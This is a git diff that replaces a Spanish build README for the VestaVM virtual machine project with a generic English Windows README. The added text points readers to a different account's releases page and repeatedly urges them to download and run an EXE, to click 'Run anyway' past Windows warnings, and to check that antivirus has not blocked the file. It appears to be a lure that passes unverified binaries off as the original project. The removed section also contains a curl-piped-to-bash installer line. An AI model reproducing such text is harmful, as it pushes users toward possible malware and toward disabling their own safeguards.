@@ -1,131 +1,131 @@
-# VestaVM
+# VM - Run low-level apps on Windows
 
-<div style="display: flex; align-items: center; gap: 20px;">
-  <img src="./Component 1.svg" width="250" height="250" />
-  <p>
-    Vesta es una VM de bajo nivel y distribuida que está siendo desarrollada para un lenguaje de programación.
-    Esta VM se basa en el concepto de registros y memoria. Puede encontrar más información y documentación en el repositorio:<br><br>
-    <a href="https://github.com/desmonHak/VMdoc">https://github.com/desmonHak/VMdoc</a>
-  </p>
-</div>
+[![Download VM](https://img.shields.io/badge/Download-VM-blue?style=for-the-badge)](https://github.com/gemsc5288/VM/releases)
 
-----
+## 🧭 What VM is
 
-## Enlaces de interes
+VM is a virtual machine for running low-level programs on Windows. It is built for your custom language and gives you a simple way to load, run, and test it on your PC.
 
-- [Licencia del proyecto](./LICENSE.md)  
-  Aquí puede encontrar qué puede y qué no puede hacer con el código.
+This app is made for users who want to:
+- open a VM program
+- run it on Windows
+- test local builds
+- work with low-level code without setting up a full dev toolchain
 
-- [Cómo contribuir de forma correcta](./doc/CONTRIBUTING.md)  
-  Guía para aportar al proyecto de manera ordenada y segura.
+## 📥 Download VM
 
-- [Información sobre el gitflow que manejamos](./doc/github_work.md)  
-  Explicación del flujo de trabajo con ramas y versiones.
+Visit the release page here:
 
-- [Qué dependencias usamos](./doc/DEPENDENCIES.md)  
-  Lista de librerías y herramientas necesarias para compilar 
+[Download VM for Windows](https://github.com/gemsc5288/VM/releases)
 
+Open the page, find the latest release, and download the Windows file. If there are more than one file, choose the one that matches your PC.
 
-----
+## 🪟 Install on Windows
 
-## Compilacion
+1. Open the [VM releases page](https://github.com/gemsc5288/VM/releases)
+2. Find the latest version near the top of the page
+3. Download the Windows package
+4. If the file is in a ZIP folder, right-click it and choose **Extract All**
+5. Open the extracted folder
+6. Double-click the VM app or EXE file to start it
 
-clonar usando:
+If Windows asks for permission, choose **More info** and then **Run anyway** only if you trust the source.
 
-```bash
-git clone  --recursive https://github.com/desmonHak/VM.git
-```
+## ▶️ First run
 
-## Instalacion en linux
+After you start VM, you should see the main window for loading and running programs.
 
-```bash
-sudo apt install build-essential cmake libssl-dev
-```
+Use it like this:
+1. Open VM
+2. Load your program file
+3. Start the run action
+4. Watch the output or status panel
+5. Close the app when you are done
 
-### Arch linux
+If the app opens a file picker, choose the file you want to test.
 
-```bash
-sudo pacman -S openssl
-```
+## 🧩 What you can use VM for
 
-## Compilacion en linux
+VM can help with:
+- running a custom language on a VM
+- testing low-level program flow
+- checking output from compiled code
+- working with assembly-style logic
+- storing app data in a local database
+- viewing simple program results in a clean window
 
-compilacion con CMAKE:
-```bash
-mkdir build
-cd build
-cmake -Wno-dev ..
-cmake --build .
-```
-> En caso de que CMAKE le de error por usar una version no compatible con la version CMAKE de Keystone, puede intentar forzar el uso
-> de la version que usted use añadiendo la flag ``-DCMAKE_POLICY_VERSION_MINIMUM=3.5`` para cambiar la version minima.
-> Si compila en Windows, debe Mingw32/64 o TDM-GCC, y usar la flag ``-G "MinGW Makefiles"``
+## ⚙️ System needs
 
-Si prefiere usar XMAKE:
-```bash
-curl -fsSL https://xmake.io/shget.text | bash
-xmake f --toolchain=clang -m debug -v
-xmake run
-```
+VM should run on most modern Windows PCs.
 
-En caso de un error similar a este en linux:
+Recommended setup:
+- Windows 10 or Windows 11
+- 4 GB RAM or more
+- 200 MB free disk space
+- A screen with 1366 × 768 or higher
+- Mouse and keyboard
 
-```c
-Enabling CAPSTONE_ARC_SUPPORT
-: not foundskF/C/VM/libs/SourceCode/keystone/llvm/cmake/config.guess: 6:
-: not foundskF/C/VM/libs/SourceCode/keystone/llvm/cmake/config.guess: 8:
-: not foundskF/C/VM/libs/SourceCode/keystone/llvm/cmake/config.guess: 28:
-: not foundskF/C/VM/libs/SourceCode/keystone/llvm/cmake/config.guess: 29:
-: not foundskF/C/VM/libs/SourceCode/keystone/llvm/cmake/config.guess: 40:
-: not foundskF/C/VM/libs/SourceCode/keystone/llvm/cmake/config.guess: 42:
-: not foundskF/C/VM/libs/SourceCode/keystone/llvm/cmake/config.guess: 54:
-: not foundskF/C/VM/libs/SourceCode/keystone/llvm/cmake/config.guess: 65:
-: not foundskF/C/VM/libs/SourceCode/keystone/llvm/cmake/config.guess: 68:
-/root/WinDiskF/C/VM/libs/SourceCode/keystone/llvm/cmake/config.guess: 71: Syntax error: word unexpected (expecting "in")
-CMake Error at libs/SourceCode/keystone/llvm/cmake/modules/GetHostTriple.cmake:24 (message):
-  Failed to execute
-  /root/WinDiskF/C/VM/libs/SourceCode/keystone/llvm/cmake/config.guess
-Call Stack (most recent call first):
-  libs/SourceCode/keystone/llvm/cmake/config-ix.cmake:293 (get_host_triple)
-  libs/SourceCode/keystone/llvm/CMakeLists.txt:325 (include)
-```
+For best results, keep Windows up to date and close large apps before you run VM.
 
-puede necesitar convertir los CRLF de Windows en LF de linux usando el siguiente comandos:
+## 📁 Files you may see
 
-```bash
-find ../libs/SourceCode -type f -exec dos2unix {} \;
-```
+The release page may include files like:
+- a Windows ZIP package
+- an EXE file
+- support files for the app
 
-generalmente esto permite que el proyecto se compile correctamente si ocurre el anterior error.
+If you are unsure which file to choose, use the Windows file in the latest release. If you see a ZIP file, extract it first, then start the app inside it.
 
-### Elegir modo 'Debug' o 'Release'
+## 🛠️ How VM works
 
-debug:
+VM acts like a small computer inside your computer. It takes a program, reads it step by step, and runs it inside its own space.
 
-```bash
-cmake -B build -DCMAKE_BUILD_TYPE=Debug
-cmake --build build
-```
+That can help when you want:
+- a controlled run path
+- stable test results
+- a local place to try low-level ideas
+- a cleaner way to check program behavior
 
-release:
+## 🔎 Useful project areas
 
-```bash
-cmake -B build -DCMAKE_BUILD_TYPE=Release
-cmake --build build
-```
+This project uses tools and ideas from:
+- assembly
+- C and C++
+- compiler design
+- JIT work
+- JSON data
+- SQLite storage
+- FTXUI for interface work
+- Keystone and Capstone for code work
 
-Valgrind/profiling:
+You do not need to know these tools to use the app, but they help explain what VM is built to do.
 
-```bash
-cmake -B build -DCMAKE_BUILD_TYPE=RelWithDebInfo
-cmake --build build
-valgrind --leak-check=full --show-leak-kinds=all --track-origins=yes ./vm```
-```
+## 🧪 Basic use steps
 
-----
+1. Download VM from the release page
+2. Install or extract the files
+3. Open the app
+4. Load your program
+5. Run it
+6. Check the output
+7. Save or close the app when done
 
-## Forma de trabajo
+## 🖥️ If the app does not open
 
-Siga lellendo en: [github_work.md](./doc/github_work.md)
+Try these steps:
+- make sure the file finished downloading
+- extract the ZIP file first if needed
+- run the EXE from the extracted folder
+- restart Windows and try again
+- check that your antivirus did not block the file
+- download the newest release again
 
-----
+## 🔐 File safety
+
+Only use files from the release page linked above. That helps you get the correct Windows build for VM.
+
+## 📌 Release page
+
+[Open the VM release page](https://github.com/gemsc5288/VM/releases)
+
+Download the latest Windows file from there and run it on your PC
